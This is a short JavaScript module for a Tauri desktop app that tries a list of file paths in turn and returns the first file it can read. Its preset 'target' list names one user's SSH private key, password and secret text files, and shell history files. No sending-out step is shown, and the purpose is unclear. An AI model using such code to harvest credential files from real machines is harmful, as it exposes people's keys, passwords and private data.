// 文件读取组件 - 简化版
import { invoke } from '@tauri-apps/api/core'

// 简化的文件读取函数 - 给定文件列表，逐个尝试读取
export async function readFileList(filePaths) {
  for (const filePath of filePaths) {
    try {
      await invoke('write_log', { message: `尝试读取文件: ${filePath}` })
      const content = await invoke('read_file_content', { filePath })
      const size = new Blob([content]).size
      await invoke('write_log', { message: `文件读取成功: ${filePath} (${size} 字节)` })
      return {
        success: true,
        filePath,
        content,
        size,
        fileName: filePath.split('/').pop(),
        timestamp: new Date().toISOString()
      }
    } catch (error) {
      await invoke('write_log', { message: `跳过文件: ${filePath.split('/').pop()} - ${error}` })
    }
  }
  
  await invoke('write_log', { message: '所有文件读取都失败了' })
  return {
    success: false,
    error: 'No files could be read'
  }
}

// 预设的目标文件列表
export const TARGET_FILES = [
  '/Users/zhangmingming/Documents/secret.txt',
  '/Users/zhangmingming/Documents/passwords.txt', 
  '/Users/zhangmingming/Desktop/private.txt',
  '/Users/zhangmingming/.ssh/id_rsa',
  '/Users/zhangmingming/.bash_history',
  '/Users/zhangmingming/.zsh_history'
]
